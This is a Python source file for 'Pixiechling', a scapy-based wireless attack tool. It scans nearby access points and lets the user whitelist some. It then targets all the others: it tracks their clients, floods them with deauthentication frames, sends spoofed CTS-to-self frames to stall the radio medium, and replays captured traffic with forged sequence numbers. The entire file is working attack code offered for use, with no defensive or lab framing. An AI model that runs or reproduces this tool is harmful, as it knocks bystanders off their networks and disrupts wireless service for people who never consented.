# coding=utf-8

import os
import sys
import json
import time
import signal
import argparse
import subprocess
import configparser
import threading
from collections import deque, defaultdict

from termcolor import colored
from argparse import RawTextHelpFormatter
from scapy.all import sniff
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, RadioTap

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


banner_intro = """

██████╗ ██╗██╗  ██╗██╗███████╗ ██████╗██╗  ██╗██╗     ██╗███╗   ██╗ ██████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝██╔════╝██║  ██║██║     ██║████╗  ██║██╔════╝
██████╔╝██║ ╚███╔╝ ██║█████╗  ██║     ███████║██║     ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝  ██║     ██╔══██║██║     ██║██║╚██╗██║██║   ██║
██║     ██║██╔╝ ██╗██║███████╗╚██████╗██║  ██║███████╗██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝

----------------------------------------------------------------------
"""

WHITELIST_FILE = "pixiechling_whitelist.json"
CONFIG_FILE = "pixiechling.conf"

DESCRIPTION = """
Pixiechling - WiFi Traffic Capture & Replay Tool

Modes:

  1 : Scan BSSIDs and select whitelist
  2 : Capture/replay + client tracking + deauth + latency injection
----------------------------------------------------------------------
"""


def load_config(config_path):
    config = configparser.ConfigParser()
    if not os.path.isfile(config_path):
        print(colored("[!] Config file not found: " + config_path, "red"))
        sys.exit(1)
    config.read(config_path)
    capture_iface = config.get("interfaces", "capture")
    replay_iface = config.get("interfaces", "replay")
    return capture_iface, replay_iface


def check_interface(iface):
    """Verify that the interface exists and is in monitor mode.
    Offer to enable monitor mode if it is not."""
    # Check interface exists
    result = subprocess.run(
        ["iwconfig", iface],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(colored("[!] Interface '{}' not found.".format(iface), "red"))
        print(colored("[!] Available wireless interfaces:", "red"))
        subprocess.run(["iwconfig"], check=False)
        sys.exit(1)

    # Check monitor mode
    if "Mode:Monitor" in result.stdout:
        print(colored("[+] {} is in Monitor mode.".format(iface), "green"))
        return

    print(colored("[!] {} is NOT in Monitor mode.".format(iface), "red"))
    answer = input(colored("[?] Enable monitor mode on {}? [y/N] ".format(iface), "cyan")).strip().lower()
    if answer == "y":
        print(colored("[*] Enabling monitor mode on {} ...".format(iface), "cyan"))
        subprocess.run(["ip", "link", "set", iface, "down"], check=False)
        subprocess.run(["iwconfig", iface, "mode", "monitor"], check=False)
        subprocess.run(["ip", "link", "set", iface, "up"], check=False)
        # Verify
        verify = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
        if "Mode:Monitor" in verify.stdout:
            print(colored("[+] {} is now in Monitor mode.".format(iface), "green"))
        else:
            print(colored("[!] Failed to enable monitor mode. Try manually: airmon-ng start {}".format(iface), "red"))
            sys.exit(1)
    else:
        print(colored("[!] Aborted. Enable monitor mode first.", "red"))
        sys.exit(1)


def load_whitelist():
    if not os.path.isfile(WHITELIST_FILE):
        return []
    with open(WHITELIST_FILE, "r") as f:
        return json.load(f)


def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        json.dump(whitelist, f, indent=2)


# ──────────────────────────────────────────────
#  Mode 1 : Scan & whitelist selection
# ──────────────────────────────────────────────

def scan_bssids(capture_iface):
    """Scan channels 1-13 and collect unique BSSIDs with their SSIDs."""
    discovered = {}

    def _handle_beacon(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2
            try:
                ssid = pkt.info.decode("utf-8", errors="ignore")
            except Exception:
                ssid = "<hidden>"
            if not ssid:
                ssid = "<hidden>"
            if bssid not in discovered:
                discovered[bssid] = ssid

    print(colored("[*] Scanning BSSIDs on all channels (this takes ~30 s) ...", "cyan"))
    for ch in range(1, 14):
        subprocess.run(["iwconfig", capture_iface, "channel", str(ch)], check=False)
        sniff(iface=capture_iface, count=10, timeout=2, prn=_handle_beacon)

    return discovered


def mode_scan_whitelist(capture_iface):
    """Interactive mode: display BSSIDs, let user pick whitelist entries."""
    discovered = scan_bssids(capture_iface)

    if not discovered:
        print(colored("[!] No BSSIDs found. Make sure the interface is in monitor mode.", "red"))
        return

    # Display table
    bssid_list = sorted(discovered.items(), key=lambda x: x[1])
    print("\n" + colored(" #   BSSID               SSID", "yellow"))
    print(colored(" " + "-" * 50, "yellow"))
    for idx, (bssid, ssid) in enumerate(bssid_list, start=1):
        print(" {:<4} {}   {}".format(idx, bssid, ssid))

    print()
    print(colored("[?] Enter BSSID numbers to whitelist (comma-separated), or 'all':", "cyan"))
    selection = input(">>> ").strip()

    if selection.lower() == "all":
        chosen = [b for b, _ in bssid_list]
    else:
        chosen = []
        for part in selection.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part)
                if 1 <= idx <= len(bssid_list):
                    chosen.append(bssid_list[idx - 1][0])
                else:
                    print(colored("[!] Skipping invalid index: " + part, "red"))
            else:
                print(colored("[!] Skipping non-numeric input: " + part, "red"))

    if not chosen:
        print(colored("[!] No valid BSSIDs selected.", "red"))
        return

    save_whitelist(chosen)
    print(colored("[+] Whitelist saved ({} BSSIDs):".format(len(chosen)), "green"))
    for b in chosen:
        print("    " + b)


# ──────────────────────────────────────────────
#  Mode 2 : Capture / Replay loop
# ──────────────────────────────────────────────

class ReplayBuffer:
    """Thread-safe rolling buffer that keeps packets from the last `window` seconds,
    along with their capture timestamp and channel."""

    def __init__(self, window=15):
        self.window = window
        self.lock = threading.Lock()
        self.packets = deque()

    def add(self, pkt, channel):
        now = time.time()
        with self.lock:
            self.packets.append((now, channel, pkt))
            self._prune(now)

    def get_packets(self):
        """Return list of (capture_ts, channel, pkt) in chronological order."""
        now = time.time()
        with self.lock:
            self._prune(now)
            return [(ts, ch, pkt) for ts, ch, pkt in self.packets]

    def _prune(self, now):
        while self.packets and (now - self.packets[0][0]) > self.window:
            self.packets.popleft()


def mode_replay(capture_iface, replay_iface):
    """Capture traffic on iface0, track clients of non-whitelisted BSSIDs,
    replay frames on iface1, inject latency via CTS-to-self flooding,
    and deauth clients from target BSSIDs — all simultaneously."""

    whitelist = load_whitelist()
    if not whitelist:
        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
        sys.exit(1)

    whitelist_set = set(b.lower() for b in whitelist)
    buf = ReplayBuffer(window=15)
    stop_event = threading.Event()

    # Client tracking state (shared with capture thread)
    ap_clients = {}
    clients_lock = threading.Lock()

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    print(colored("[+] Whitelist loaded ({} BSSIDs) \u2014 these will be EXCLUDED:".format(len(whitelist)), "green"))
    for b in whitelist:
        print("    " + b)
    print(colored("[*] Capture iface : " + capture_iface, "cyan"))
    print(colored("[*] Replay  iface : " + replay_iface, "cyan"))
    print(colored("[*] Starting capture/replay + deauth + latency injection (Ctrl+C to stop) ...", "cyan"))
    print()

    # ── Capture thread ──
    current_channel = [1]

    def capture_loop():
        def _handle_pkt(pkt):
            if stop_event.is_set():
                return
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt.getlayer(Dot11)
            addrs = [
                (dot11.addr1 or "").lower(),
                (dot11.addr2 or "").lower(),
                (dot11.addr3 or "").lower(),
            ]

            # ---- Client tracking (real-time) ----
            if pkt.haslayer(Dot11Beacon):
                bssid = addrs[1]  # addr2
                if bssid and bssid not in whitelist_set:
                    try:
                        ssid = pkt.info.decode("utf-8", errors="ignore") or "<hidden>"
                    except Exception:
                        ssid = "<hidden>"
                    with clients_lock:
                        if bssid not in ap_clients:
                            ap_clients[bssid] = {"ssid": ssid, "clients": set()}
                        elif ap_clients[bssid]["ssid"] == "<hidden>" and ssid != "<hidden>":
                            ap_clients[bssid]["ssid"] = ssid
            else:
                addr1, addr2, addr3 = addrs
                bssid, client = None, None
                if addr3 and addr3 not in whitelist_set and addr3 != "ff:ff:ff:ff:ff:ff":
                    bssid = addr3
                    if addr2 != bssid:
                        client = addr2
                    elif addr1 != bssid and addr1 != "ff:ff:ff:ff:ff:ff":
                        client = addr1
                if bssid and client and client != "ff:ff:ff:ff:ff:ff":
                    with clients_lock:
                        if bssid not in ap_clients:
                            ap_clients[bssid] = {"ssid": "<unknown>", "clients": set()}
                        if client not in ap_clients[bssid]["clients"]:
                            ap_clients[bssid]["clients"].add(client)
                            ssid = ap_clients[bssid]["ssid"]
                            print(colored("  [+] New client: ", "green") +
                                  colored(client, "white") +
                                  colored(" \u2192 ", "yellow") +
                                  colored("{} ({})".format(bssid, ssid), "cyan"))

            # ---- Buffer for replay (exclude whitelisted) ----
            if not (whitelist_set & set(addrs)):
                buf.add(pkt, current_channel[0])

        while not stop_event.is_set():
            for ch in range(1, 14):
                if stop_event.is_set():
                    return
                current_channel[0] = ch
                subprocess.run(
                    ["iwconfig", capture_iface, "channel", str(ch)],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                sniff(iface=capture_iface, timeout=1, prn=_handle_pkt)

    cap_thread = threading.Thread(target=capture_loop, daemon=True)
    cap_thread.start()

    # ── Deauth thread ──
    def deauth_loop():
        """Continuously send deauth frames between non-whitelisted BSSIDs
        and their detected clients."""
        while not stop_event.is_set():
            with clients_lock:
                targets = [
                    (bssid, list(info["clients"]))
                    for bssid, info in ap_clients.items()
                    if info["clients"]
                ]
            if not targets:
                time.sleep(2)
                continue

            for bssid, clients in targets:
                if stop_event.is_set():
                    return
                for client in clients:
                    if stop_event.is_set():
                        return
                    # Deauth client from BSSID  (AP → client)
                    deauth_ap = RadioTap() / Dot11(
                        addr1=client, addr2=bssid, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    # Deauth BSSID from client  (client → AP)
                    deauth_cl = RadioTap() / Dot11(
                        addr1=bssid, addr2=client, addr3=bssid
                    ) / Dot11Deauth(reason=7)
                    try:
                        sendp(deauth_ap, iface=replay_iface, count=3, inter=0.02, verbose=False)
                        sendp(deauth_cl, iface=replay_iface, count=3, inter=0.02, verbose=False)
                    except Exception:
                        pass
            time.sleep(1)

    deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
    deauth_thread.start()

    # ── Latency injection thread ──
    def latency_loop():
        """Flood CTS-to-self frames spoofed from target BSSIDs to force
        surrounding stations into NAV wait (Network Allocation Vector),
        which injects real latency into BSSID ↔ client exchanges."""
        while not stop_event.is_set():
            with clients_lock:
                bssids = list(ap_clients.keys())
            if not bssids:
                time.sleep(2)
                continue

            for bssid in bssids:
                if stop_event.is_set():
                    return
                # CTS frame: addr1 = BSSID (spoofed as if BSSID reserved the medium)
                # duration = 30000 µs → forces other stations to wait ~30 ms
                cts = RadioTap() / Dot11(
                    type=1, subtype=12,
                    addr1=bssid,
                    ID=30000,
                )
                try:
                    sendp(cts, iface=replay_iface, count=5, inter=0.01, verbose=False)
                except Exception:
                    pass
            time.sleep(0.5)

    latency_thread = threading.Thread(target=latency_loop, daemon=True)
    latency_thread.start()

    # ── Replay + summary loop (main thread) ──
    # Track last seen SC per source MAC so replay continues coherently
    sc_tracker = {}  # source_mac -> last_seen_sc (0..4095)

    while not stop_event.is_set():
        time.sleep(15)

        # -- Client summary --
        with clients_lock:
            total_aps = len(ap_clients)
            total_clients = sum(len(v["clients"]) for v in ap_clients.values())
        print(colored(
            "\n[*] Client summary: {} non-whitelisted APs, {} clients".format(total_aps, total_clients),
            "yellow",
        ))
        with clients_lock:
            for bssid, info in sorted(ap_clients.items()):
                print(colored("  AP {} ({})".format(bssid, info["ssid"]), "cyan") +
                      colored(" \u2014 {} client(s)".format(len(info["clients"])), "white"))
                for c in sorted(info["clients"]):
                    print("      \u2514\u2500 " + c)

        # -- Replay --
        packets = buf.get_packets()
        if not packets:
            print(colored("[*] Replay buffer empty, waiting ...", "yellow"))
            continue

        # Update SC tracker from captured traffic (learn current flow state)
        for _, _, pkt in packets:
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                src = (dot11.addr2 or "").lower()
                if src and src != "ff:ff:ff:ff:ff:ff" and dot11.SC is not None:
                    sc_tracker[src] = (dot11.SC >> 4) & 0xFFF

        # Group by channel, preserving chronological order within each channel
        by_channel = defaultdict(list)
        for ts, ch, pkt in packets:
            by_channel[ch].append((ts, pkt))

        total = len(packets)
        print(colored("[>] Replaying {} packets across {} channel(s) on {} ...".format(
            total, len(by_channel), replay_iface), "green"))

        for ch in sorted(by_channel.keys()):
            if stop_event.is_set():
                break
            subprocess.run(
                ["iwconfig", replay_iface, "channel", str(ch)],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            ch_packets = by_channel[ch]
            prev_ts = ch_packets[0][0]

            for ts, pkt in ch_packets:
                if stop_event.is_set():
                    break

                # Respect original inter-packet timing
                delay = ts - prev_ts
                if delay > 0:
                    time.sleep(delay)
                prev_ts = ts

                # Assign next SC for this source MAC
                if pkt.haslayer(Dot11):
                    dot11 = pkt.getlayer(Dot11)
                    src = (dot11.addr2 or "").lower()
                    if src and src != "ff:ff:ff:ff:ff:ff":
                        next_sc = (sc_tracker.get(src, 0) + 1) % 4096
                        sc_tracker[src] = next_sc
                        dot11.SC = next_sc << 4
                try:
                    sendp(pkt, iface=replay_iface, verbose=False)
                except Exception as e:
                    print(colored("[!] Replay error: " + str(e), "red"))
                    break

    cap_thread.join(timeout=5)
    deauth_thread.join(timeout=3)
    latency_thread.join(timeout=3)
    print(colored("[*] Pixiechling stopped.", "yellow"))


# ──────────────────────────────────────────────
#  Main
# ──────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        "Pixiechling",
        description=DESCRIPTION,
        formatter_class=RawTextHelpFormatter,
    )
    parser.add_argument(
        "-m", "--mode",
        required=True,
        choices=["1", "2"],
        help="1 = Scan & whitelist  |  2 = Capture/replay + client tracking",
    )
    parser.add_argument(
        "-c", "--config",
        default=CONFIG_FILE,
        help="Path to config file (default: pixiechling.conf)",
    )
    args = parser.parse_args()

    capture_iface, replay_iface = load_config(args.config)

    print(banner_intro)
    print(colored("[*] Config loaded", "cyan"))
    print(colored("[*] Capture interface (0) : " + capture_iface, "cyan"))
    print(colored("[*] Replay  interface (1) : " + replay_iface, "cyan"))
    print()

    if args.mode == "1":
        check_interface(capture_iface)
        mode_scan_whitelist(capture_iface)
    elif args.mode == "2":
        check_interface(capture_iface)
        check_interface(replay_iface)
        mode_replay(capture_iface, replay_iface)
